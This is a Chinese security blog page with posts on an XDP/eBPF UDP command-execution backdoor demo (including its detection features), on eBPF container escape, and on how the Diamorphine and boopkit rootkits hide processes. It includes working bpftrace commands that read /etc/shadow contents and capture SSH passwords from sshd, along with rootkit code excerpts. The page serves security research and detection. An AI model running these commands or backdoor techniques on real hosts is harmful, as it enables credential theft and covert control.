<h1 id="xdp后门demo"><a href="#xdp后门demo" class="headerlink" title="xdp后门demo"></a>xdp后门demo</h1><p>demo的源码我放到了github上：<a target="_blank" rel="noopener" href="https://github.com/leveryd/ebpf-app/tree/master/xdp_udp_backdoor">https://github.com/leveryd/ebpf-app/tree/master/xdp_udp_backdoor</a></p>
<p>最终实现了的后门demo效果如下, 控制端通过udp协议和被控端单向通信，被控端从通信流量中提取出payload后执行命令。</p>
<p><img src="https://user-images.githubusercontent.com/1846319/184612669-b393c611-0465-4a20-a7f1-09a70f5f8498.png" alt="image"></p>
<ul>
<li>通信数据格式是：| eth header | ip header | udp header | MAGIC_START command MAGIC_END |</li>
<li>被控端(xdp程序)提取udp数据后，通过<code>BPF_MAP_TYPE_ARRAY</code>类型的map将udp数据传给用户态程序</li>
<li>用户态程序执行<code>system(command)</code>执行系统命令后，清理map数据</li>
</ul>
<p>关于xdp编程的基本概念，我就不复述网络上已有的内容了。如果你和我一样是ebpf xdp新手，我推荐你看 <a target="_blank" rel="noopener" href="https://developers.redhat.com/blog/2021/04/01/get-started-with-xdp">Get started with XDP</a> 这篇入门文章。另外代码注释中的参考文章也不错。</p>
<p>在实现demo、加载xdp程序时，我遇到过两个报错。如果你也遇到，就可以参考我的解决办法。</p>
<p>第一个报错如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@08363214ec12:&#x2F;mnt# ip link set eth0 xdpgeneric obj xdp_udp_backdoor_bpf.o sec xdp_backdoor</span><br><span class="line"></span><br><span class="line">BTF debug data section &#39;.BTF&#39; rejected: Invalid argument (22)!</span><br><span class="line"> - Length:       741</span><br><span class="line">Verifier analysis:</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>这个报错的原因是某些ip命令不支持btf。如果你想要解决这个报错，有两种方式，一是centos系统上可以用xdp-loader工具替代ip命令加载xdp程序，二是基于libbpf库的bpf_set_link_xdp_fd接口编程实现加载xdp程序，就像demo中那样。</p>
<p>第二个报错如下，提示 BPF程序指令过多，超过1000000条的限制。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv xdp_backdoor]# make load</span><br><span class="line">[root@instance-h9w7mlyv xdp_backdoor]# make load</span><br><span class="line">clang -O2 -g -Wall -target bpf -c xdp_udp_backdoor.bpf.c -o xdp_udp_backdoor_bpf.o</span><br><span class="line">ip link set eth0 xdpgeneric off</span><br><span class="line">ip link set eth0 xdpgeneric obj xdp_udp_backdoor_bpf.o sec xdp_backdoor</span><br><span class="line">...</span><br><span class="line">BPF program is too large. Processed 1000001 insn</span><br><span class="line">processed 1000001 insns (limit 1000000) max_states_per_insn 18 total_states 18267 peak_states 4070 mark_read 5</span><br><span class="line"></span><br><span class="line">libbpf: -- END LOG --</span><br><span class="line">libbpf: failed to load program &#39;xdp_func&#39;</span><br><span class="line">libbpf: failed to load object &#39;xdp_udp_backdoor_bpf.o&#39;</span><br></pre></td></tr></table></figure>

<p>这个报错的原因是在加载ebpf程序时，会经过内核中<a target="_blank" rel="noopener" href="https://ebpf.io/what-is-ebpf/#verification">ebpf Verification</a>的校验，其中它会检查是否有ebpf程序是否可能出现死循环。</p>
<p>下面代码编译后的ebpf程序就会检查失败，出现上面的报错信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">void mystrncpy(char *dest, const char *src, size_t count)</span><br><span class="line">&#123;</span><br><span class="line">      char *tmp &#x3D; dest;</span><br><span class="line"></span><br><span class="line">      &#x2F;&#x2F; #pragma clang loop unroll(full)</span><br><span class="line">      while (count) &#123;</span><br><span class="line">              if ((*tmp &#x3D; *src) !&#x3D; 0)</span><br><span class="line">                      src++;</span><br><span class="line">              tmp++;</span><br><span class="line">              count--;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以尝试使用<code>#pragma clang loop unroll(full)</code>告诉编译器编译时对循环做展开，来解决这个报错问题。</p>
<blockquote>
<p>这个解决办法是在 <a target="_blank" rel="noopener" href="https://rexrock.github.io/post/ebpf1/">https://rexrock.github.io/post/ebpf1/</a> 文中看到的</p>
</blockquote>
<h1 id="检测：xdp后门的特征"><a href="#检测：xdp后门的特征" class="headerlink" title="检测：xdp后门的特征"></a>检测：xdp后门的特征</h1><p><code>bpftool prog</code>能看到xdp程序信息、<code>bpftool map</code>能看到xdp程序和应用程序通信用到的map信息</p>
<p><img src="https://user-images.githubusercontent.com/1846319/185065176-b2115f0d-c22b-4f3f-84fc-d51f1877a2e4.png"></p>
<p>应用程序文件描述符中也有map id信息</p>
<p><img src="https://user-images.githubusercontent.com/1846319/185066192-d61d9a39-f960-4ad0-893d-4d7871f349e9.png"></p>
<p>应用程序想要执行命令时也会有一些特征，比如demo中使用system执行系统命令时，会有fork系统调用。</p>
<p>应用程序如果想要将命令结果回传、或者反弹shell，主机上也能抓到这一部分流量。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>xdp概念、xdp编程的知识都在参考链接中，本文非常粗浅地分析一点xdp后门的优点和检测方式，希望能对你有点帮助。</p>
<p>在搞完这个demo后，我才发现有一个看起来很完善的xdp后门<a target="_blank" rel="noopener" href="https://github.com/h3xduck/TripleCross">TripleCross</a>。</p>
<p>在研究ebpf和主机安全中，还参考学习<a target="_blank" rel="noopener" href="https://www.cnxct.com/">美团工程师CFC4N博客</a>上的内容。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022-07-29-%E5%9F%BA%E4%BA%8Eebpf%E7%9A%84%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8(%E4%B8%8A)/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="leveryd">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="leveryd的个人博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022-07-29-%E5%9F%BA%E4%BA%8Eebpf%E7%9A%84%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8(%E4%B8%8A)/" class="post-title-link" itemprop="url">基于ebpf的容器逃逸(上)</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-07-29 19:17:09" itemprop="dateCreated datePublished" datetime="2022-07-29T19:17:09+08:00">2022-07-29</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2022-08-03 10:17:31" itemprop="dateModified" datetime="2022-08-03T10:17:31+08:00">2022-08-03</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p><a target="_blank" rel="noopener" href="https://github.com/knownsec/KCon/blob/master/2021/Container%20escape%20in%202021.pdf">Container escape in 2021</a> 和 <a target="_blank" rel="noopener" href="https://security.tencent.com/index.php/blog/msg/206">云原生安全攻防｜使用eBPF逃逸容器技术分析与实践</a> 都提到了基于ebpf的容器逃逸。</p>
<p>本文简要记录自己对这两篇文章的学习、复现，并给出一个demo，希望对主机安全有兴趣的读者有点帮助。</p>
<h1 id="快速验证”可以用ebpf在容器中读宿主机文件”"><a href="#快速验证”可以用ebpf在容器中读宿主机文件”" class="headerlink" title="快速验证”可以用ebpf在容器中读宿主机文件”"></a>快速验证”可以用ebpf在容器中读宿主机文件”</h1><p><a target="_blank" rel="noopener" href="https://github.com/knownsec/KCon/blob/master/2021/Container%20escape%20in%202021.pdf">Container escape in 2021</a> 有一页PPT</p>
<p><img src="https://user-images.githubusercontent.com/1846319/182094230-dd1ca6f7-d970-417f-8d40-18739873e580.png"></p>
<p>你也可以输入以下命令，来复现上面”在容器中观测到宿主机文件内容”的效果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# docker run -it --cap-add sys_admin --cap-add sys_resource quay.io&#x2F;iovisor&#x2F;bpftrace:latest bash</span><br><span class="line">root@6a6339858e9a:&#x2F;# mount -t debugfs none &#x2F;sys&#x2F;kernel&#x2F;debug</span><br><span class="line">root@6a6339858e9a:&#x2F;# export BPFTRACE_STRLEN&#x3D;200       &#x2F;&#x2F; https:&#x2F;&#x2F;github.com&#x2F;iovisor&#x2F;bpftrace&#x2F;blob&#x2F;master&#x2F;docs&#x2F;reference_guide.md#91-bpftrace_strlen</span><br><span class="line">root@6a6339858e9a:&#x2F;# bpftrace -e &#39;kretfunc:vfs_read &#x2F;comm&#x3D;&#x3D;&quot;cat&quot;&#x2F; &#123;printf(&quot;%s,%d\n&quot;,str(uptr(args-&gt;buf),retval),retval);&#125;&#39;</span><br><span class="line">Attaching 1 probe...</span><br></pre></td></tr></table></figure>

<p><img src="https://user-images.githubusercontent.com/1846319/181756031-d22cec4c-9456-4a8e-9b0b-94e0512b7db7.png"></p>
<blockquote>
<p>bpftrace可以参考<a target="_blank" rel="noopener" href="https://github.com/iovisor/bpftrace">官方文档</a></p>
</blockquote>
<p>上面是根据命令名来过滤，查看特定命令读取的文件内容。你也可以根据文件名来过滤。</p>
<p>比如输入以下命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv tmp]# docker run -it -v &#x2F;tmp:&#x2F;tmp --cap-add sys_admin --cap-add sys_resource quay.io&#x2F;iovisor&#x2F;bpftrace:latest bash</span><br><span class="line">root@b0e60d8c7219:&#x2F;# mount -t debugfs none &#x2F;sys&#x2F;kernel&#x2F;debug</span><br><span class="line">root@b0e60d8c7219:&#x2F;# export BPFTRACE_STRLEN&#x3D;150</span><br><span class="line">root@b0e60d8c7219:&#x2F;# bpftrace &#x2F;tmp&#x2F;1.bt</span><br><span class="line">Attaching 9 probes...</span><br></pre></td></tr></table></figure>

<p><img src="https://user-images.githubusercontent.com/1846319/182092087-d797efac-fc85-4b0b-b025-d13628f9eac9.png"></p>
<p>1.bt 代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">BEGIN</span><br><span class="line">&#123;</span><br><span class="line">	printf(&quot;Tracing file content... Hit Ctrl-C to end.\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tracepoint:syscalls:sys_enter_open,</span><br><span class="line">tracepoint:syscalls:sys_enter_openat</span><br><span class="line">&#x2F; strncmp(str(args-&gt;filename), &quot;&#x2F;etc&#x2F;shadow&quot;, 11) &#x3D;&#x3D; 0 &#x2F;      &#x2F;&#x2F; 待观测的文件路径</span><br><span class="line">&#123;</span><br><span class="line">	@filename[tid] &#x3D; args-&gt;filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tracepoint:syscalls:sys_exit_open,</span><br><span class="line">tracepoint:syscalls:sys_exit_openat</span><br><span class="line">&#x2F;@filename[tid]&#x2F;</span><br><span class="line">&#123;</span><br><span class="line">	$ret &#x3D; args-&gt;ret;</span><br><span class="line">	$fd &#x3D; $ret &gt; 0 ? $ret : -1;</span><br><span class="line"></span><br><span class="line">  @fd_filenmae_map[tid, $fd] &#x3D; @filename[tid];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tracepoint:syscalls:sys_enter_read</span><br><span class="line">&#x2F;@fd_filenmae_map[tid, args-&gt;fd]&#x2F;</span><br><span class="line">&#123;</span><br><span class="line">  @read_buf[tid] &#x3D; args-&gt;buf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tracepoint:syscalls:sys_exit_read</span><br><span class="line">&#x2F;@read_buf[tid]&#x2F;</span><br><span class="line">&#123;</span><br><span class="line">	printf(&quot;filename:%s, content:%s\n&quot;, str(@filename[tid]), str(uptr(@read_buf[tid])))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tracepoint:syscalls:sys_enter_close</span><br><span class="line">&#x2F;@fd_filenmae_map[tid, args-&gt;fd]&#x2F;</span><br><span class="line">&#123;</span><br><span class="line">  delete(@filename[tid]);</span><br><span class="line">  delete(@fd_filenmae_map[tid, args-&gt;fd]);</span><br><span class="line">  delete(@read_buf[tid]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">END</span><br><span class="line">&#123;</span><br><span class="line">	clear(@filename);</span><br><span class="line">  clear(@fd_filenmae_map);</span><br><span class="line">  clear(@read_buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="验证”获取用户密码”"><a href="#验证”获取用户密码”" class="headerlink" title="验证”获取用户密码”"></a>验证”获取用户密码”</h1><p>sshd write系统调用中会有ssh密码信息，如下<br><img src="https://user-images.githubusercontent.com/1846319/182098510-d487a570-5c78-4620-ba82-87733a850f39.png"></p>
<p>所以，你可以在容器中用 ‘tracepoint:syscalls:sys_enter_write’ 来获取ssh密码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bpftrace -e &#39;tracepoint:syscalls:sys_enter_write &#x2F;comm&#x3D;&#x3D;&quot;sshd&quot;&#x2F; &#123;</span><br><span class="line">  if (args-&gt;fd &#x3D;&#x3D; 6)&#123;</span><br><span class="line">    printf(&quot;%s\n&quot;,str(args-&gt;buf+4));  &#x2F;&#x2F; 前四个字节是0</span><br><span class="line">  &#125;</span><br><span class="line">&#125;&#39;</span><br></pre></td></tr></table></figure>

<p><img src="https://user-images.githubusercontent.com/1846319/182009021-c0471216-1413-48a6-871d-43efaf3196b2.png"></p>
<blockquote>
<p>我测试的ssh是OpenSSH_8.0p1，可能你的ssh发行版和我不同，并不一定通过hook write系统调用来获取用户密码。</p>
</blockquote>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>基于ebpf做容器逃逸时，重点是需要知道hook哪个函数。</p>
<p>比如 <a target="_blank" rel="noopener" href="https://www.cnxct.com/container-escape-in-linux-kernel-space-by-ebpf">内核态eBPF程序实现容器逃逸与隐藏账号rootkit</a> 文章中是hook哪个函数呢？</p>
<p>另一个重点是”ebpf怎么修改数据”。前面的两个例子都只用bpftrace观测数据，而没有修改<code>args-&gt;buf</code>中的数据。</p>
<p><a target="_blank" rel="noopener" href="https://security.tencent.com/index.php/blog/msg/206">云原生安全攻防｜使用eBPF逃逸容器技术分析与实践</a> 、 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/EoiyhMIn6VpxWK92AZS_PQ">lkm和ebpf rootkit分析的简要记录</a> 的例子中都涉及到”ebpf修改数据”。</p>
<p>bpftrace目前只有<code>override()</code>能修改部分<code>kprobes</code>的返回值，所以下一篇我会用<code>libbpf</code>演示”ebpf修改数据能造成什么效果”。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022-07-27-lkm%E5%92%8Cebpf%20rootkit%E5%88%86%E6%9E%90%E7%9A%84%E7%AE%80%E8%A6%81%E8%AE%B0%E5%BD%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="leveryd">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="leveryd的个人博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022-07-27-lkm%E5%92%8Cebpf%20rootkit%E5%88%86%E6%9E%90%E7%9A%84%E7%AE%80%E8%A6%81%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">lkm和ebpf rootkit分析的简要记录</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-07-27 14:50:51" itemprop="dateCreated datePublished" datetime="2022-07-27T14:50:51+08:00">2022-07-27</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2022-07-31 17:23:05" itemprop="dateModified" datetime="2022-07-31T17:23:05+08:00">2022-07-31</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/9ZSxpeUHTcgQrQ1Ys5uROw">再次捕获云上在野容器攻击，TeamTNT黑产攻击方法揭秘</a> 文章中提到一个<a target="_blank" rel="noopener" href="https://github.com/m0nad/Diamorphine">内核rootkit-Diamorphine</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnxct.com/ebpf-rootkit-how-boopkit-works/">新型eBPF后门boopkit的原理分析与演示</a> 也提到基于<a target="_blank" rel="noopener" href="https://github.com/kris-nova/boopkit">ebpf的rootkit</a></p>
<p>本文简要分析这两个rootkit在”进程隐藏”上实现的区别。</p>
<blockquote>
<p>特别因为是eBPF只能通过<a target="_blank" rel="noopener" href="https://ebpf.io/what-is-ebpf#helper-calls">“helper functions”</a>调用内核能力，而不能直接调用内核函数、修改内核数据结构，所以我好奇eBPF后门怎么实现”进程隐藏”。</p>
</blockquote>
<h1 id="lkm-rootkit是怎么隐藏进程的"><a href="#lkm-rootkit是怎么隐藏进程的" class="headerlink" title="lkm rootkit是怎么隐藏进程的"></a>lkm rootkit是怎么隐藏进程的</h1><p>通过修改<code>__sys_call_table</code>，hook了kill、getdents64系统调用。</p>
<p>用户在调用kill系统调用时，rootkit在收到信号”SIGMODINVIS”(头文件中可以看到是31)后，就会执行两步：</p>
<ul>
<li>for_each_process找到进程task_struct</li>
<li>修改task_struct的flags</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; diamorphine.c</span><br><span class="line">hacked_kill(pid_t pid, int sig)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">	struct task_struct *task;</span><br><span class="line">	switch (sig) &#123;</span><br><span class="line">		case SIGINVIS:</span><br><span class="line">			if ((task &#x3D; find_task(pid)) &#x3D;&#x3D; NULL) &#x2F;&#x2F; 根据pid找到task_struct实例</span><br><span class="line">				return -ESRCH;</span><br><span class="line">			task-&gt;flags ^&#x3D; PF_INVISIBLE;</span><br><span class="line">			break;</span><br></pre></td></tr></table></figure>

<p>用户在getdents64系统调用查看目录信息时，rootkit会修改返回给用户的目录信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,</span><br><span class="line">	unsigned int count)</span><br><span class="line">&#123;</span><br><span class="line">  int ret &#x3D; orig_getdents64(fd, dirent, count), err;  &#x2F;&#x2F; 调用原先的getdents64函数</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">  kdirent &#x3D; kzalloc(ret, GFP_KERNEL);   &#x2F;&#x2F; 申请ret大小的内核内存</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">	err &#x3D; copy_from_user(kdirent, dirent, ret);   &#x2F;&#x2F; 将&quot;目录信息&quot;复制一份</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">	while (off &lt; ret) &#123;</span><br><span class="line">		dir &#x3D; (void *)kdirent + off;</span><br><span class="line">		if ((!proc &amp;&amp;</span><br><span class="line">		(memcmp(MAGIC_PREFIX, dir-&gt;d_name, strlen(MAGIC_PREFIX)) &#x3D;&#x3D; 0))   &#x2F;&#x2F; 文件以MAGIC_PREFIX开头</span><br><span class="line">		|| (proc &amp;&amp;</span><br><span class="line">		is_invisible(simple_strtoul(dir-&gt;d_name, NULL, 10)))) &#123; &#x2F;&#x2F; &#x2F;proc&#x2F;$&#123;pid&#125; 被标记成需要隐藏</span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">  err &#x3D; copy_to_user(dirent, kdirent, ret);   &#x2F;&#x2F; 将修改后的&quot;目录信息&quot;复制给用户</span><br></pre></td></tr></table></figure>


<p>测试后，就会发现rootkit会影响<code>/proc</code>目录中是否可以看到进程目录。</p>
<p><img src="https://user-images.githubusercontent.com/1846319/181194318-b17ebd7f-3ac1-4f3f-8977-4fafb2e2bdcf.png" alt="image"></p>
<p>实际上是rootkit影响了getdents64系统调用的结果<br><img src="https://user-images.githubusercontent.com/1846319/181200677-1e2775a9-cc60-45fb-8295-1e3606ba7aaf.png" alt="image"></p>
<p>ps命令也是读<code>/proc</code>目录来获取进程信息的，所以rootkit影响ps命令结果<br><img src="https://user-images.githubusercontent.com/1846319/181199847-6750c019-74f6-41b5-a7f9-b20113093bd3.png" alt="image"></p>
<p>所以这个lkm rootkit是通过修改task_struct的flags字段来给进程打个标记，等getdents64时会根据标记判断是不是要修改目录信息。</p>
<p>eBPF程序不能直接修改内核数据，那eBPF后门是怎么做”进程隐藏”的呢？</p>
<h1 id="ebpf-rootkit是怎么隐藏进程的"><a href="#ebpf-rootkit是怎么隐藏进程的" class="headerlink" title="ebpf rootkit是怎么隐藏进程的"></a>ebpf rootkit是怎么隐藏进程的</h1><p>getdents64系统调用可以用来获取目录信息，<code>man 2 getdents</code>可以知道第二个指针参数指向”目录条目”buffer</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int getdents64(unsigned int fd, struct linux_dirent64 *dirp,</span><br><span class="line">             unsigned int count);</span><br></pre></td></tr></table></figure>

<p>“目录条目”数据结构如下，因为有”柔性数组”，所以用d_reclen记录了大小，这样就可以在”目录条目”buffer中定位到下一个”目录条目”。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">struct linux_dirent64 &#123;</span><br><span class="line">    ino64_t        d_ino;    &#x2F;* 64-bit inode number *&#x2F;</span><br><span class="line">    off64_t        d_off;    &#x2F;* 64-bit offset to next structure *&#x2F;</span><br><span class="line">    unsigned short d_reclen; &#x2F;* Size of this dirent *&#x2F;  当前&quot;目录条目&quot;的大小</span><br><span class="line">    unsigned char  d_type;   &#x2F;* File type *&#x2F;</span><br><span class="line">    char           d_name[]; &#x2F;* Filename (null-terminated) *&#x2F; 柔性数组</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>pr0be.safe.c 注释写得很清楚，通过增大”目标进程所属的目录条目的前一个目录条目”的d_reclen值，使得用户程序在遍历<code>*dirp</code>结果时，就会跳过”目标进程所属的目录条目”。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SEC(&quot;tp&#x2F;syscalls&#x2F;sys_exit_getdents64&quot;)</span><br><span class="line">int handle_getdents_patch(struct trace_event_raw_sys_exit *ctx) &#123;</span><br><span class="line">  ...</span><br><span class="line">  &#x2F;&#x2F; Unlink target, by reading in previous linux_dirent64 struct,</span><br><span class="line">  &#x2F;&#x2F; and setting it&#39;s d_reclen to cover itself and our target.</span><br><span class="line">  &#x2F;&#x2F; This will make the program skip over our folder.</span><br><span class="line">  ...</span><br><span class="line">  &#x2F;&#x2F; Attempt to overwrite</span><br><span class="line">  short unsigned int d_reclen_new &#x3D; d_reclen_previous + d_reclen;</span><br><span class="line">  long ret &#x3D; bpf_probe_write_user(&amp;dirp_previous-&gt;d_reclen, &amp;d_reclen_new,</span><br><span class="line">                                  sizeof(d_reclen_new));</span><br></pre></td></tr></table></figure>

<p>因为<code>&amp;dirp_previous-&gt;d_reclen</code>是用户空间地址，而不是内核空间地址，所以ebpf可以用<code>bpf_probe_write_user</code> helper functions 修改<code>dirp</code>地址中的数据。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>案例中的lkm rootkit和ebpf rootkit都是通过修改getdents64系统调用中<code>dirp</code>地址指向的内容，使得查看<code>/proc</code>目录信息时，看不到进程信息。</p>
<p>根据<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/43003805/can-ebpf-modify-the-return-value-or-parameters-of-a-syscall">帖子</a>知道，想利用ebpf修改系统调用的参数值或返回值有很大的限制。因为dirp是一个用户空间地址，所以ebpf程序可以用<code>bpf_probe_write_user</code>修改此地址的内容。</p>
<!--
# 参考
https://man7.org/linux/man-pages/man7/bpf-helpers.7.html

# 特征

都用到 bpf_probe_write_user
-->

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022-07-11-CVE-2020-8558-%E8%B7%A8%E4%B8%BB%E6%9C%BA%E8%AE%BF%E9%97%AE127.0.0.1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="leveryd">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="leveryd的个人博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022-07-11-CVE-2020-8558-%E8%B7%A8%E4%B8%BB%E6%9C%BA%E8%AE%BF%E9%97%AE127.0.0.1/" class="post-title-link" itemprop="url">CVE-2020-8558-跨主机访问127.0.0.1</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

